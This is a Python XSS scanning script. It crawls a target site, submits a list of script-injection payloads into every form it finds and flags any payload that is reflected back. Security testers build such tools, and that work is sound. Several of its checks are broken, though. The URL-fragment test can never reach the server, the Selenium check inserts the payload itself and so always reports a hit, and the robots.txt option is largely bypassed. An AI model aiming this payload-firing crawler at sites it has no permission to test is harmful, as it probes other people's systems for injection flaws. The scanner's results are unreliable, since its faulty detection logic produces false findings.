import requests
from pprint import pprint
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin, urlparse
from urllib.robotparser import RobotFileParser
from colorama import Fore, Style
import argparse
import urllib3
import time
import random
import threading
from selenium import webdriver
from selenium.webdriver.common.by import By

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# List of more advanced XSS payloads to test
XSS_PAYLOADS = [
    '"><svg/onload=alert(1)>',
    '\'><svg/onload=alert(1)>',
    '<img src=x onerror=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    '\'><img src=x onerror=alert(1)>',
    "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//--></script>",
    "<Script>alert('XSS')</scripT>",
    "<script>alert(document.cookie)</script>",
    "javascript:/*--></title></style></textarea></script><script>alert(1)//",
    "<svg/onload=confirm('XSS')>",
    "<img src='x' onerror='confirm(1)'>",
    "<a href='javascript:alert(1)'>Click me</a>",
    "<div style='background-image: url(javascript:alert(1))'>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
]

# Global variables
crawled_links = set()


# Function to print all crawled links
def print_crawled_links():
    print(f"\n[+] Links crawled:")
    for link in crawled_links:
        print(f"    {link}")
    print()


# Get all forms from a URL
def get_all_forms(url):
    try:
        soup = bs(requests.get(url, verify=False).content, "html.parser")
        return soup.find_all("form")
    except requests.exceptions.RequestException as e:
        print(f"[-] Error retrieving forms from {url}: {e}")
        return []


# Extract form details (action, method, inputs)
def get_form_details(form):
    details = {}
    action = form.attrs.get("action", "").lower()
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})

    # Handle other form elements like <select> and <textarea>
    for select_tag in form.find_all("select"):
        input_name = select_tag.attrs.get("name")
        options = [
            {"type": "select", "name": input_name, "options": [opt.text for opt in select_tag.find_all("option")]}]
        inputs.extend(options)

    for textarea_tag in form.find_all("textarea"):
        input_name = textarea_tag.attrs.get("name")
        inputs.append({"type": "textarea", "name": input_name})

    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details


# Submit a form with XSS payload
def submit_form(form_details, url, payload):
    target_url = urljoin(url, form_details["action"])
    inputs = form_details["inputs"]
    data = {}
    for input in inputs:
        if input["type"] in ["text", "search", "textarea"]:
            input["value"] = payload
        input_name = input.get("name")
        input_value = input.get("value")
        if input_name and input_value:
            data[input_name] = input_value
    try:
        if form_details["method"] == "post":
            return requests.post(target_url, data=data, verify=False)
        else:
            return requests.get(target_url, params=data, verify=False)
    except requests.exceptions.RequestException as e:
        print(f"[-] Error submitting form to {target_url}: {e}")
        return None


# Get all links from a URL
def get_all_links(url):
    try:
        soup = bs(requests.get(url, verify=False).content, "html.parser")
        return [urljoin(url, link.get("href")) for link in soup.find_all("a")]
    except requests.exceptions.RequestException as e:
        print(f"[-] Error retrieving links from {url}: {e}")
        return []


# Function to test for DOM-based XSS (URL Fragment Injection)
def test_for_dom_based_xss(url, payload):
    test_url = f"{url}#{payload}"
    response = requests.get(test_url, verify=False)
    if payload in response.text:
        print(f"{Fore.GREEN}[+] DOM-based XSS found in URL fragment: {test_url}{Style.RESET_ALL}")


# Function to handle XSS scanning
def scan_xss(args, scanned_urls=None):
    global crawled_links
    if scanned_urls is None:
        scanned_urls = set()

    if args.url in scanned_urls:
        return False
    scanned_urls.add(args.url)

    forms = get_all_forms(args.url)
    print(f"\n[+] Detected {len(forms)} forms on {args.url}")

    parsed_url = urlparse(args.url)
    domain = f"{parsed_url.scheme}://{parsed_url.netloc}"

    if args.obey_robots:
        robot_parser = RobotFileParser()
        robot_parser.set_url(urljoin(domain, "/robots.txt"))
        try:
            robot_parser.read()
        except Exception as e:
            print(f"[-] Error reading robots.txt file for {domain}: {e}")
            crawl_allowed = False
        else:
            crawl_allowed = robot_parser.can_fetch("*", args.url)
    else:
        crawl_allowed = True

    if crawl_allowed or parsed_url.path:
        for form in forms:
            form_details = get_form_details(form)
            form_vulnerable = False
            for payload in XSS_PAYLOADS:
                response = submit_form(form_details, args.url, payload)
                if response and payload in response.content.decode():
                    print(f"\n{Fore.GREEN}[+] XSS Vulnerability Detected on {args.url}{Style.RESET_ALL}")
                    print(f"[*] Form Details:")
                    pprint(form_details)
                    print(f"{Fore.YELLOW}[*] Payload: {payload} {Style.RESET_ALL}")
                    if args.output:
                        with open(args.output, "a") as f:
                            f.write(f"URL: {args.url}\n")
                            f.write(f"Form Details: {form_details}\n")
                            f.write(f"Payload: {payload}\n")
                            f.write("-" * 50 + "\n\n")
                    form_vulnerable = True
                    break

            if not form_vulnerable:
                print(f"{Fore.MAGENTA}[-] No XSS vulnerability found on {args.url}{Style.RESET_ALL}")

    # Test URL fragments and query parameters for XSS
    for payload in XSS_PAYLOADS:
        test_for_dom_based_xss(args.url, payload)

    if args.crawl:
        print(f"\n[+] Crawling links from {args.url}")
        links = get_all_links(args.url)
        for link in set(links):
            if link.startswith(domain):
                crawled_links.add(link)
                if args.max_links and len(crawled_links) >= args.max_links:
                    print(f"{Fore.CYAN}[-] Maximum links ({args.max_links}) limit reached. Exiting...{Style.RESET_ALL}")
                    print_crawled_links()
                    return
                args.url = link
                scan_xss(args, scanned_urls)


# Headless Browser Automation (Optional for JavaScript-heavy websites)
def test_js_payload_with_selenium(url, payload):
    options = webdriver.ChromeOptions()
    options.add_argument("--headless")
    driver = webdriver.Chrome(options=options)
    driver.get(url)
    driver.execute_script(f"document.body.innerHTML += '<div>{payload}</div>'")
    if payload in driver.page_source:
        print(f"{Fore.GREEN}[+] XSS vulnerability found with Selenium on {url}{Style.RESET_ALL}")
    driver.quit()


# Main function
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Enhanced XSS Vulnerability scanner script.")
    parser.add_argument("url", help="URL to scan for XSS vulnerabilities")
    parser.add_argument("-c", "--crawl", action="store_true", help="Crawl links from the given URL")
    parser.add_argument("-m", "--max-links", type=int, default=0,
                        help="Maximum number of links to visit. Default 0, no limit.")
    parser.add_argument("--obey-robots", action="store_true", help="Obey robots.txt rules")
    parser.add_argument("-o", "--output", help="Output file to save the results")
    args = parser.parse_args()

    scan_xss(args)

    print_crawled_links()
